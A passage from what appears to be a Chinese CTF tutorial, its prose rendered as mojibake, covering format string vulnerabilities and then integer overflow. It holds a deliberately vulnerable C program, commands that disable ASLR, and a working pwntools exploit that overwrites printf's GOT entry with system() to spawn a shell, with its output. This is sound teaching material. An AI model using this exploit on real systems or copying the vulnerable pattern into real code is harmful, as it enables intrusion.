RIP: 0x400648 (&lt;main+113&gt;:      call   0x4004e0 &lt;printf@plt&gt;)
R8 : 0x7fffffffe3c6 --&gt; 0x44434241 ('ABCD')
R9 : 0xa ('\n')
R10: 0x7ffff7dd4380 --&gt; 0x7ffff7dd0640 --&gt; 0x7ffff7b9ed3a --&gt; 0x636d656d5f5f0043 ('C')
R11: 0x246
R12: 0x400500 (&lt;_start&gt;:        xor    ebp,ebp)
R13: 0x7fffffffe540 --&gt; 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40063d &lt;main+102&gt;: mov    r8,rdi
   0x400640 &lt;main+105&gt;: mov    rdi,rax
   0x400643 &lt;main+108&gt;: mov    eax,0x0
=&gt; 0x400648 &lt;main+113&gt;: call   0x4004e0 &lt;printf@plt&gt;
   0x40064d &lt;main+118&gt;: mov    edi,0xa
   0x400652 &lt;main+123&gt;: call   0x4004d0 &lt;putchar@plt&gt;
   0x400657 &lt;main+128&gt;: nop
   0x400658 &lt;main+129&gt;: leave
Guessed arguments:
arg[0]: 0x7fffffffe3d0 (&quot;AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.&quot;)
arg[1]: 0x1
arg[2]: 0x88888888
arg[3]: 0xffffffff
arg[4]: 0x7fffffffe3c6 --&gt; 0x44434241 ('ABCD')
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe3c0 --&gt; 0x4241000000000000 ('')
0008| 0x7fffffffe3c8 --&gt; 0x4443 ('CD')
0016| 0x7fffffffe3d0 (&quot;AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.&quot;)
0024| 0x7fffffffe3d8 (&quot;%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.&quot;)
0032| 0x7fffffffe3e0 (&quot;.%p.%p.%p.%p.%p.%p.%p.&quot;)
0040| 0x7fffffffe3e8 (&quot;p.%p.%p.%p.%p.&quot;)
0048| 0x7fffffffe3f0 --&gt; 0x2e70252e7025 ('%p.%p.')
0056| 0x7fffffffe3f8 --&gt; 0x1
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000400648 in main ()
gdb-peda$ x/10g $rsp
0x7fffffffe3c0: 0x4241000000000000      0x0000000000004443
0x7fffffffe3d0: 0x4141414141414141      0x70252e70252e7025
0x7fffffffe3e0: 0x252e70252e70252e      0x2e70252e70252e70
0x7fffffffe3f0: 0x00002e70252e7025      0x0000000000000001
0x7fffffffe400: 0x0000000000f0b5ff      0x00000000000000c2
gdb-peda$ c
Continuing.
AAAAAAAA0x1.0x88888888.0xffffffff.0x7fffffffe3c6.0xa.0x4241000000000000.0x4443.0x4141414141414141.0x70252e70252e7025.0x252e70252e70252e.
</code></pre>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æœ€åŽçš„è¾“å‡ºä¸­ï¼Œå‰äº”ä¸ªæ•°å­—åˆ†åˆ«æ¥è‡ªå¯„å­˜å™¨ <code>RSI</code>ã€<code>RDX</code>ã€<code>RCX</code>ã€<code>R8</code> å’Œ <code>R9</code>ï¼ŒåŽé¢çš„æ•°å­—æ‰å–è‡ªæ ˆï¼Œ<code>0x4141414141414141</code> åœ¨ <code>%8$p</code> çš„ä½ç½®ã€‚è¿™é‡Œè¿˜æœ‰ä¸ªåœ°æ–¹è¦æ³¨æ„ï¼Œæˆ‘ä»¬å‰é¢è¯´çš„ Linux æœ‰ 6 ä¸ªå¯„å­˜å™¨ç”¨äºŽä¼ é€’å‚æ•°ï¼Œå¯æ˜¯è¿™é‡Œåªè¾“å‡ºäº† 5 ä¸ªï¼ŒåŽŸå› æ˜¯æœ‰ä¸€ä¸ªå¯„å­˜å™¨ <code>RDI</code> è¢«ç”¨äºŽä¼ é€’æ ¼å¼å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä»Ž gdb ä¸­çœ‹åˆ°ï¼Œ<code>arg[0]</code> å°±æ˜¯ç”± <code>RDI</code> ä¼ é€’çš„æ ¼å¼å­—ç¬¦ä¸²ã€‚ï¼ˆçŽ°åœ¨ä½ å¯ä»¥å†å›žåˆ° x86 çš„ç›¸å…³å†…å®¹ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ x86 ä¸­æ ¼å¼å­—ç¬¦ä¸²é€šè¿‡æ ˆä¼ é€’çš„ï¼Œä½†æ˜¯åŒæ ·çš„ä¹Ÿä¸ä¼šè¢«æ‰“å°å‡ºæ¥ï¼‰å…¶ä»–çš„æ“ä½œå’Œ x86 æ²¡æœ‰ä»€ä¹ˆå¤§çš„åŒºåˆ«ï¼Œåªæ˜¯è¿™æ—¶æˆ‘ä»¬å°±ä¸èƒ½ä¿®æ”¹ <code>arg2</code> çš„å€¼äº†ï¼Œå› ä¸ºå®ƒè¢«å­˜å…¥äº†å¯„å­˜å™¨ä¸­ã€‚</p>
<h2 id="ctf">CTF ä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ž</h2>
<h3 id="pwntools-pwnlibfmtstr">pwntools pwnlib.fmtstr æ¨¡å—</h3>
<p>æ–‡æ¡£åœ°å€ï¼šhttp://pwntools.readthedocs.io/en/stable/fmtstr.html</p>
<p>è¯¥æ¨¡å—æä¾›äº†ä¸€äº›å­—ç¬¦ä¸²æ¼æ´žåˆ©ç”¨çš„å·¥å…·ã€‚è¯¥æ¨¡å—ä¸­å®šä¹‰äº†ä¸€ä¸ªç±» <code>FmtStr</code> å’Œä¸€ä¸ªå‡½æ•° <code>fmtstr_payload</code>ã€‚</p>
<p><code>FmtStr</code> æä¾›äº†è‡ªåŠ¨åŒ–çš„å­—ç¬¦ä¸²æ¼æ´žåˆ©ç”¨ï¼š</p>
<pre><code class="language-python">class pwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0)
</code></pre>
<ul>
<li>execute_fmt (function)ï¼šä¸Žæ¼æ´žè¿›ç¨‹è¿›è¡Œäº¤äº’çš„å‡½æ•°</li>
<li>offset (int)ï¼šä½ æŽ§åˆ¶çš„ç¬¬ä¸€ä¸ªæ ¼å¼åŒ–ç¨‹åºçš„åç§»é‡</li>
<li>padlen (int)ï¼šåœ¨ paylod ä¹‹å‰æ·»åŠ çš„ pad çš„å¤§å°</li>
<li>numbwritten (int)ï¼šå·²ç»å†™å…¥çš„å­—èŠ‚æ•°</li>
</ul>
<p><code>fmtstr_payload</code> ç”¨äºŽè‡ªåŠ¨ç”Ÿæˆæ ¼å¼åŒ–å­—ç¬¦ä¸² paylodï¼š</p>
<pre><code class="language-python">pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')
</code></pre>
<ul>
<li>offset (int)ï¼šä½ æŽ§åˆ¶çš„ç¬¬ä¸€ä¸ªæ ¼å¼åŒ–ç¨‹åºçš„åç§»é‡</li>
<li>writes (dict)ï¼šæ ¼å¼ä¸º {addr: value, addr2: value2}ï¼Œç”¨äºŽå¾€ addr é‡Œå†™å…¥ value çš„å€¼ï¼ˆå¸¸ç”¨ï¼š{printf_got}ï¼‰</li>
<li>numbwritten (int)ï¼šå·²ç»ç”± printf å‡½æ•°å†™å…¥çš„å­—èŠ‚æ•°</li>
<li>write_size (str)ï¼šå¿…é¡»æ˜¯ byteï¼Œshort æˆ– intã€‚å‘Šè¯‰ä½ æ˜¯è¦é€ byte å†™ï¼Œé€ short å†™è¿˜æ˜¯é€ int å†™ï¼ˆhhnï¼Œhnæˆ–nï¼‰</li>
</ul>
<p>æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥ç†Ÿæ‚‰ä¸‹è¯¥æ¨¡å—çš„ä½¿ç”¨ï¼ˆä»»æ„åœ°å€å†…å­˜è¯»å†™ï¼‰ï¼š<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/src/others/3.1.1_format_string/fmt.c">fmt.c</a> <a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/src/others/3.1.1_format_string/fmt">fmt</a></p>
<pre><code class="language-c">#include&lt;stdio.h&gt;
void main() {
    char str[1024];
    while(1) {
        memset(str, '\0', 1024);
        read(0, str, 1024);
        printf(str);
        fflush(stdout);
    }
}
</code></pre>
<p>ä¸ºäº†ç®€å•ä¸€ç‚¹ï¼Œæˆ‘ä»¬å…³é—­ ASLRï¼Œå¹¶ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ç¼–è¯‘ï¼Œå…³é—­ PIEï¼Œä½¿å¾—ç¨‹åºçš„ .text .bss ç­‰æ®µçš„å†…å­˜åœ°å€å›ºå®šï¼š</p>
<pre><code class="language-text"># echo 0 &gt; /proc/sys/kernel/randomize_va_space
$ gcc -m32 -fno-stack-protector -no-pie fmt.c
</code></pre>
<p>å¾ˆæ˜Žæ˜¾ï¼Œç¨‹åºå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žï¼Œæˆ‘ä»¬çš„æ€è·¯æ˜¯å°† <code>printf()</code> å‡½æ•°çš„åœ°å€æ”¹æˆ <code>system()</code> å‡½æ•°çš„åœ°å€ï¼Œè¿™æ ·å½“æˆ‘ä»¬å†æ¬¡è¾“å…¥ <code>/bin/sh</code> æ—¶ï¼Œå°±å¯ä»¥èŽ·å¾— shell äº†ã€‚</p>
<p>ç¬¬ä¸€æ­¥å…ˆè®¡ç®—åç§»ï¼Œè™½ç„¶ pwntools ä¸­å¯ä»¥å¾ˆæ–¹ä¾¿åœ°æž„é€ å‡º expï¼Œä½†è¿™é‡Œï¼Œæˆ‘ä»¬è¿˜æ˜¯å…ˆæ¼”ç¤ºæ‰‹å·¥æ–¹æ³•æ€Žä¹ˆåšï¼Œæœ€åŽå†ç”¨ pwntools çš„æ–¹æ³•ã€‚åœ¨ gdb ä¸­ï¼Œå…ˆåœ¨ <code>main</code> å¤„ä¸‹æ–­ç‚¹ï¼Œè¿è¡Œç¨‹åºï¼Œè¿™æ—¶ libc å·²ç»è¢«åŠ è½½è¿›æ¥äº†ã€‚æˆ‘ä»¬è¾“å…¥ "AAAA" è¯•ä¸€ä¸‹ï¼š</p>
<pre><code class="language-text">gdb-peda$ b main
...
gdb-peda$ r
...
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffffd1f0 (&quot;AAAA\n&quot;)
EBX: 0x804a000 --&gt; 0x8049f10 --&gt; 0x1
ECX: 0xffffd1f0 (&quot;AAAA\n&quot;)
EDX: 0x400
ESI: 0xf7f97000 --&gt; 0x1bbd90
EDI: 0x0
EBP: 0xffffd5f8 --&gt; 0x0
ESP: 0xffffd1e0 --&gt; 0xffffd1f0 (&quot;AAAA\n&quot;)
EIP: 0x8048512 (&lt;main+92&gt;:      call   0x8048370 &lt;printf@plt&gt;)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048508 &lt;main+82&gt;: sub    esp,0xc
   0x804850b &lt;main+85&gt;: lea    eax,[ebp-0x408]
   0x8048511 &lt;main+91&gt;: push   eax
=&gt; 0x8048512 &lt;main+92&gt;: call   0x8048370 &lt;printf@plt&gt;
   0x8048517 &lt;main+97&gt;: add    esp,0x10
   0x804851a &lt;main+100&gt;:        mov    eax,DWORD PTR [ebx-0x4]
   0x8048520 &lt;main+106&gt;:        mov    eax,DWORD PTR [eax]
   0x8048522 &lt;main+108&gt;:        sub    esp,0xc
Guessed arguments:
arg[0]: 0xffffd1f0 (&quot;AAAA\n&quot;)
[------------------------------------stack-------------------------------------]
0000| 0xffffd1e0 --&gt; 0xffffd1f0 (&quot;AAAA\n&quot;)
0004| 0xffffd1e4 --&gt; 0xffffd1f0 (&quot;AAAA\n&quot;)
0008| 0xffffd1e8 --&gt; 0x400
0012| 0xffffd1ec --&gt; 0x80484d0 (&lt;main+26&gt;:      add    ebx,0x1b30)
0016| 0xffffd1f0 (&quot;AAAA\n&quot;)
0020| 0xffffd1f4 --&gt; 0xa ('\n')
0024| 0xffffd1f8 --&gt; 0x0
0028| 0xffffd1fc --&gt; 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048512 in main ()
</code></pre>
<p>æˆ‘ä»¬çœ‹åˆ°è¾“å…¥ <code>printf()</code> çš„å˜é‡ <code>arg[0]: 0xffffd1f0 ("AAAA\n")</code> åœ¨æ ˆçš„ç¬¬ 5 è¡Œï¼Œé™¤åŽ»ç¬¬ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå³åç§»é‡ä¸º 4ã€‚</p>
<p>è¯»å–é‡å®šä½è¡¨èŽ·å¾— <code>printf()</code> çš„ GOT åœ°å€ï¼ˆç¬¬ä¸€åˆ— Offsetï¼‰ï¼š</p>
<pre><code class="language-text">$ readelf -r a.out

Relocation section '.rel.dyn' at offset 0x2f4 contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff8  00000406 R_386_GLOB_DAT    00000000   __gmon_start__
08049ffc  00000706 R_386_GLOB_DAT    00000000   stdout@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x304 contains 5 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a014  00000307 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0
0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a01c  00000607 R_386_JUMP_SLOT   00000000   memset@GLIBC_2.0
</code></pre>
<p>åœ¨ gdb ä¸­èŽ·å¾— <code>printf()</code> çš„è™šæ‹Ÿåœ°å€ï¼š</p>
<pre><code class="language-text">gdb-peda$ p printf
$1 = {&lt;text variable, no debug info&gt;} 0xf7e26bf0 &lt;printf&gt;
</code></pre>
<p>èŽ·å¾— <code>system()</code> çš„è™šæ‹Ÿåœ°å€ï¼š</p>
<pre><code class="language-text">gdb-peda$ p system
$1 = {&lt;text variable, no debug info&gt;} 0xf7e17060 &lt;system&gt;
</code></pre>
<p>å¥½äº†ï¼Œæ¼”ç¤ºå®Œæ€Žæ ·ç”¨æ‰‹å·¥çš„æ–¹å¼å¾—åˆ°æž„é€  exp éœ€è¦çš„ä¿¡æ¯ï¼Œä¸‹é¢æˆ‘ä»¬ç»™å‡ºä½¿ç”¨ pwntools æž„é€ çš„å®Œæ•´æ¼æ´žåˆ©ç”¨ä»£ç ï¼š</p>
<pre><code class="language-python"># -*- coding: utf-8 -*-
from pwn import *

elf = ELF('./a.out')
r = process('./a.out')
libc = ELF('/usr/lib32/libc.so.6')

# è®¡ç®—åç§»é‡
def exec_fmt(payload):
    r.sendline(payload)
    info = r.recv()
    return info
auto = FmtStr(exec_fmt)
offset = auto.offset

# èŽ·å¾— printf çš„ GOT åœ°å€
printf_got = elf.got['printf']
log.success(&quot;printf_got =&gt; {}&quot;.format(hex(printf_got)))

# èŽ·å¾— printf çš„è™šæ‹Ÿåœ°å€
payload = p32(printf_got) + '%{}$s'.format(offset)
r.send(payload)
printf_addr = u32(r.recv()[4:8])
log.success(&quot;printf_addr =&gt; {}&quot;.format(hex(printf_addr)))

# èŽ·å¾— system çš„è™šæ‹Ÿåœ°å€
system_addr = printf_addr - (libc.symbols['printf'] - libc.symbols['system'])
log.success(&quot;system_addr =&gt; {}&quot;.format(hex(system_addr)))

payload = fmtstr_payload(offset, {printf_got : system_addr})
r.send(payload)
r.send('/bin/sh')
r.recv()
r.interactive()
$ python2 exp.py
[*] '/home/firmy/Desktop/RE4B/a.out'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './a.out': pid 17375
[*] '/usr/lib32/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Found format string offset: 4
[+] printf_got =&gt; 0x804a010
[+] printf_addr =&gt; 0xf7e26bf0
[+] system_addr =&gt; 0xf7e17060
[*] Switching to interactive mode
$ echo &quot;hacked!&quot;
hacked!
</code></pre>
<p>è¿™æ ·æˆ‘ä»¬å°±èŽ·å¾—äº† shellï¼Œå¯ä»¥çœ‹åˆ°è¾“å‡ºçš„ä¿¡æ¯å’Œæˆ‘ä»¬æ‰‹å·¥å¾—åˆ°çš„ä¿¡æ¯å®Œå…¨ç›¸åŒã€‚</p>
<h2 id="312">3.1.2 æ•´æ•°æº¢å‡º</h2>
<ul>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.2_integer_overflow.html#ä»€ä¹ˆæ˜¯æ•´æ•°æº¢å‡º">ä»€ä¹ˆæ˜¯æ•´æ•°æº¢å‡º</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.2_integer_overflow.html#æ•´æ•°æº¢å‡º">æ•´æ•°æº¢å‡º</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.2_integer_overflow.html#æ•´æ•°æº¢å‡ºç¤ºä¾‹">æ•´æ•°æº¢å‡ºç¤ºä¾‹</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.2_integer_overflow.html#ctf-ä¸­çš„æ•´æ•°æº¢å‡º">CTF ä¸­çš„æ•´æ•°æº¢å‡º</a></li>
</ul>
<h2 id="_13">ä»€ä¹ˆæ˜¯æ•´æ•°æº¢å‡º</h2>
<h3 id="_14">ç®€ä»‹</h3>
<p>åœ¨ C è¯­è¨€åŸºç¡€çš„ç« èŠ‚ä¸­ï¼Œæˆ‘ä»¬ä»‹ç»äº† C è¯­è¨€æ•´æ•°çš„åŸºç¡€çŸ¥è¯†ï¼Œä¸‹é¢æˆ‘ä»¬è¯¦ç»†ä»‹ç»æ•´æ•°çš„å®‰å…¨é—®é¢˜ã€‚</p>
<p>ç”±äºŽæ•´æ•°åœ¨å†…å­˜é‡Œé¢ä¿å­˜åœ¨ä¸€ä¸ªå›ºå®šé•¿åº¦çš„ç©ºé—´å†…ï¼Œå®ƒèƒ½å­˜å‚¨çš„æœ€å¤§å€¼å’Œæœ€å°å€¼æ˜¯å›ºå®šçš„ï¼Œå¦‚æžœæˆ‘ä»¬å°è¯•åŽ»å­˜å‚¨ä¸€ä¸ªæ•°ï¼Œè€Œè¿™ä¸ªæ•°åˆå¤§äºŽè¿™ä¸ªå›ºå®šçš„æœ€å¤§å€¼æ—¶ï¼Œå°±ä¼šå¯¼è‡´æ•´æ•°æº¢å‡ºã€‚ï¼ˆx86-32 çš„æ•°æ®æ¨¡åž‹æ˜¯ ILP32ï¼Œå³æ•´æ•°ï¼ˆIntï¼‰ã€é•¿æ•´æ•°ï¼ˆLongï¼‰å’ŒæŒ‡é’ˆï¼ˆPointerï¼‰éƒ½æ˜¯ 32 ä½ã€‚ï¼‰</p>
<h3 id="_15">æ•´æ•°æº¢å‡ºçš„å±å®³</h3>
<p>å¦‚æžœä¸€ä¸ªæ•´æ•°ç”¨æ¥è®¡ç®—ä¸€äº›æ•æ„Ÿæ•°å€¼ï¼Œå¦‚ç¼“å†²åŒºå¤§å°æˆ–æ•°å€¼ç´¢å¼•ï¼Œå°±ä¼šäº§ç”Ÿæ½œåœ¨çš„å±é™©ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œæ•´æ•°æº¢å‡ºå¹¶æ²¡æœ‰æ”¹å†™é¢å¤–çš„å†…å­˜ï¼Œä¸ä¼šç›´æŽ¥å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œï¼Œä½†æ˜¯å®ƒä¼šå¯¼è‡´æ ˆæº¢å‡ºå’Œå †æº¢å‡ºï¼Œè€ŒåŽä¸¤è€…éƒ½ä¼šå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚ç”±äºŽæ•´æ•°æº¢å‡ºå‡ºçŽ°ä¹‹åŽï¼Œå¾ˆéš¾è¢«ç«‹å³å¯Ÿè§‰ï¼Œæ¯”è¾ƒéš¾ç”¨ä¸€ä¸ªæœ‰æ•ˆçš„æ–¹æ³•åŽ»åˆ¤æ–­æ˜¯å¦å‡ºçŽ°æˆ–è€…å¯èƒ½å‡ºçŽ°æ•´æ•°æº¢å‡ºã€‚</p>
<h2 id="_16">æ•´æ•°æº¢å‡º</h2>
<p>å…³äºŽæ•´æ•°çš„å¼‚å¸¸æƒ…å†µä¸»è¦æœ‰ä¸‰ç§ï¼š</p>
<ul>
<li>æº¢å‡º</li>
<li>åªæœ‰æœ‰ç¬¦å·æ•°æ‰ä¼šå‘ç”Ÿæº¢å‡ºã€‚æœ‰ç¬¦å·æ•°æœ€é«˜ä½è¡¨ç¤ºç¬¦å·ï¼Œåœ¨ä¸¤æ­£æˆ–ä¸¤è´Ÿç›¸åŠ æ—¶ï¼Œæœ‰å¯èƒ½æ”¹å˜ç¬¦å·ä½çš„å€¼ï¼Œäº§ç”Ÿæº¢å‡º</li>
<li>æº¢å‡ºæ ‡å¿— <code>OF</code> å¯æ£€æµ‹æœ‰ç¬¦å·æ•°çš„æº¢å‡º</li>
<li>å›žç»•</li>
<li>æ— ç¬¦å·æ•° <code>0-1</code> æ—¶ä¼šå˜æˆæœ€å¤§çš„æ•°ï¼Œå¦‚ 1 å­—èŠ‚çš„æ— ç¬¦å·æ•°ä¼šå˜ä¸º <code>255</code>ï¼Œè€Œ <code>255+1</code> ä¼šå˜æˆæœ€å°æ•° <code>0</code>ã€‚</li>
<li>è¿›ä½æ ‡å¿— <code>CF</code> å¯æ£€æµ‹æ— ç¬¦å·æ•°çš„å›žç»•</li>
<li>æˆªæ–­</li>
<li>å°†ä¸€ä¸ªè¾ƒå¤§å®½åº¦çš„æ•°å­˜å…¥ä¸€ä¸ªå®½åº¦å°çš„æ“ä½œæ•°ä¸­ï¼Œé«˜ä½å‘ç”Ÿæˆªæ–­</li>
</ul>
<h3 id="_17">æœ‰ç¬¦å·æ•´æ•°æº¢å‡º</h3>
<ul>
<li>ä¸Šæº¢å‡º</li>
</ul>
<pre><code class="language-c">int i;
i = INT_MAX;  // 2 147 483 647
i++;
printf(&quot;i = %d\n&quot;, i);  // i = -2 147 483 648
</code></pre>
<ul>
<li>ä¸‹æº¢å‡º</li>
</ul>
<pre><code class="language-c">i = INT_MIN;  // -2 147 483 648
i--;
printf(&quot;i = %d\n&quot;, i);  // i = 2 147 483 647
</code></pre>
<h3 id="_18">æ— ç¬¦å·æ•°å›žç»•</h3>
<p>æ¶‰åŠæ— ç¬¦å·æ•°çš„è®¡ç®—æ°¸è¿œä¸ä¼šæº¢å‡ºï¼Œå› ä¸ºä¸èƒ½ç”¨ç»“æžœä¸ºæ— ç¬¦å·æ•´æ•°è¡¨ç¤ºçš„ç»“æžœå€¼è¢«è¯¥ç±»åž‹å¯ä»¥è¡¨ç¤ºçš„æœ€å¤§å€¼åŠ  1 ä¹‹å’Œå–æ¨¡å‡ï¼ˆreduced moduloï¼‰ã€‚å› ä¸ºå›žç»•ï¼Œä¸€ä¸ªæ— ç¬¦å·æ•´æ•°è¡¨è¾¾å¼æ°¸è¿œæ— æ³•æ±‚å‡ºå°äºŽé›¶çš„å€¼ã€‚</p>
<p>ä½¿ç”¨ä¸‹å›¾ç›´è§‚åœ°ç†è§£å›žç»•ï¼Œåœ¨è½®ä¸ŠæŒ‰é¡ºæ—¶é’ˆæ–¹å‘å°†å€¼é€’å¢žäº§ç”Ÿçš„å€¼ç´§æŒ¨ç€å®ƒï¼š</p>
<p><img alt="img" src="https://firmianay.gitbooks.io/ctf-all-in-one/content/pic/1.5.1_unsigned_integer.png" /></p>
<pre><code class="language-c">unsigned int ui;
ui = UINT_MAX;  // åœ¨ x86-32 ä¸Šä¸º 4 294 967 295
ui++;
printf(&quot;ui = %u\n&quot;, ui);  // ui = 0
ui = 0;
ui--;
printf(&quot;ui = %u\n&quot;, ui);  // åœ¨ x86-32 ä¸Šï¼Œui = 4 294 967 295
</code></pre>
<h3 id="_19">æˆªæ–­</h3>
<ul>
<li>åŠ æ³•æˆªæ–­ï¼š</li>
</ul>
<pre><code class="language-text">0xffffffff + 0x00000001
= 0x0000000100000000 (long long)
= 0x00000000 (long)
</code></pre>
<ul>
<li>ä¹˜æ³•æˆªæ–­ï¼š</li>
</ul>
<pre><code class="language-text">0x00123456 * 0x00654321
= 0x000007336BF94116 (long long)
= 0x6BF94116 (long)
</code></pre>
<h3 id="_20">æ•´åž‹æå‡å’Œå®½åº¦æº¢å‡º</h3>
<p>æ•´åž‹æå‡æ˜¯æŒ‡å½“è®¡ç®—è¡¨è¾¾å¼ä¸­åŒ…å«äº†ä¸åŒå®½åº¦çš„æ“ä½œæ•°æ—¶ï¼Œè¾ƒå°å®½åº¦çš„æ“ä½œæ•°ä¼šè¢«æå‡åˆ°å’Œè¾ƒå¤§æ“ä½œæ•°ä¸€æ ·çš„å®½åº¦ï¼Œç„¶åŽå†è¿›è¡Œè®¡ç®—ã€‚</p>
<p>ç¤ºä¾‹ï¼š<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/src/others/3.1.2_integer_overflow/width_overflow.c">æºç </a></p>
<pre><code class="language-c">#include&lt;stdio.h&gt;
void main() {
    int l;  
    short s;
    char c;

    l = 0xabcddcba;
    s = l;
    c = l;

    printf(&quot;å®½åº¦æº¢å‡º\n&quot;);
    printf(&quot;l = 0x%x (%d bits)\n&quot;, l, sizeof(l) * 8);
    printf(&quot;s = 0x%x (%d bits)\n&quot;, s, sizeof(s) * 8);
    printf(&quot;c = 0x%x (%d bits)\n&quot;, c, sizeof(c) * 8);

    printf(&quot;æ•´åž‹æå‡\n&quot;);
    printf(&quot;s + c = 0x%x (%d bits)\n&quot;, s+c, sizeof(s+c) * 8);
}
$ ./a.out
å®½åº¦æº¢å‡º
l = 0xabcddcba (32 bits)
s = 0xffffdcba (16 bits)
c = 0xffffffba (8 bits)
æ•´åž‹æå‡
s + c = 0xffffdc74 (32 bits)
</code></pre>
<p>ä½¿ç”¨ gdb æŸ¥çœ‹åæ±‡ç¼–ä»£ç ï¼š</p>
<pre><code class="language-text">gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x0000056d &lt;+0&gt;:     lea    ecx,[esp+0x4]
   0x00000571 &lt;+4&gt;:     and    esp,0xfffffff0
   0x00000574 &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]
   0x00000577 &lt;+10&gt;:    push   ebp
   0x00000578 &lt;+11&gt;:    mov    ebp,esp
   0x0000057a &lt;+13&gt;:    push   ebx
   0x0000057b &lt;+14&gt;:    push   ecx
   0x0000057c &lt;+15&gt;:    sub    esp,0x10
   0x0000057f &lt;+18&gt;:    call   0x470 &lt;__x86.get_pc_thunk.bx&gt;
   0x00000584 &lt;+23&gt;:    add    ebx,0x1a7c
   0x0000058a &lt;+29&gt;:    mov    DWORD PTR [ebp-0xc],0xabcddcba
   0x00000591 &lt;+36&gt;:    mov    eax,DWORD PTR [ebp-0xc]
   0x00000594 &lt;+39&gt;:    mov    WORD PTR [ebp-0xe],ax
   0x00000598 &lt;+43&gt;:    mov    eax,DWORD PTR [ebp-0xc]
   0x0000059b &lt;+46&gt;:    mov    BYTE PTR [ebp-0xf],al
   0x0000059e &lt;+49&gt;:    sub    esp,0xc
   0x000005a1 &lt;+52&gt;:    lea    eax,[ebx-0x1940]
   0x000005a7 &lt;+58&gt;:    push   eax
   0x000005a8 &lt;+59&gt;:    call   0x400 &lt;puts@plt&gt;
   0x000005ad &lt;+64&gt;:    add    esp,0x10
   0x000005b0 &lt;+67&gt;:    sub    esp,0x4
   0x000005b3 &lt;+70&gt;:    push   0x20
   0x000005b5 &lt;+72&gt;:    push   DWORD PTR [ebp-0xc]
   0x000005b8 &lt;+75&gt;:    lea    eax,[ebx-0x1933]
   0x000005be &lt;+81&gt;:    push   eax
   0x000005bf &lt;+82&gt;:    call   0x3f0 &lt;printf@plt&gt;
   0x000005c4 &lt;+87&gt;:    add    esp,0x10
   0x000005c7 &lt;+90&gt;:    movsx  eax,WORD PTR [ebp-0xe]
   0x000005cb &lt;+94&gt;:    sub    esp,0x4
   0x000005ce &lt;+97&gt;:    push   0x10
   0x000005d0 &lt;+99&gt;:    push   eax
   0x000005d1 &lt;+100&gt;:   lea    eax,[ebx-0x191f]
   0x000005d7 &lt;+106&gt;:   push   eax
   0x000005d8 &lt;+107&gt;:   call   0x3f0 &lt;printf@plt&gt;
   0x000005dd &lt;+112&gt;:   add    esp,0x10
   0x000005e0 &lt;+115&gt;:   movsx  eax,BYTE PTR [ebp-0xf]
   0x000005e4 &lt;+119&gt;:   sub    esp,0x4
   0x000005e7 &lt;+122&gt;:   push   0x8
   0x000005e9 &lt;+124&gt;:   push   eax
   0x000005ea &lt;+125&gt;:   lea    eax,[ebx-0x190b]
   0x000005f0 &lt;+131&gt;:   push   eax
   0x000005f1 &lt;+132&gt;:   call   0x3f0 &lt;printf@plt&gt;
   0x000005f6 &lt;+137&gt;:   add    esp,0x10
   0x000005f9 &lt;+140&gt;:   sub    esp,0xc
   0x000005fc &lt;+143&gt;:   lea    eax,[ebx-0x18f7]
   0x00000602 &lt;+149&gt;:   push   eax
   0x00000603 &lt;+150&gt;:   call   0x400 &lt;puts@plt&gt;
   0x00000608 &lt;+155&gt;:   add    esp,0x10
   0x0000060b &lt;+158&gt;:   movsx  edx,WORD PTR [ebp-0xe]
   0x0000060f &lt;+162&gt;:   movsx  eax,BYTE PTR [ebp-0xf]
   0x00000613 &lt;+166&gt;:   add    eax,edx
   0x00000615 &lt;+168&gt;:   sub    esp,0x4
   0x00000618 &lt;+171&gt;:   push   0x20
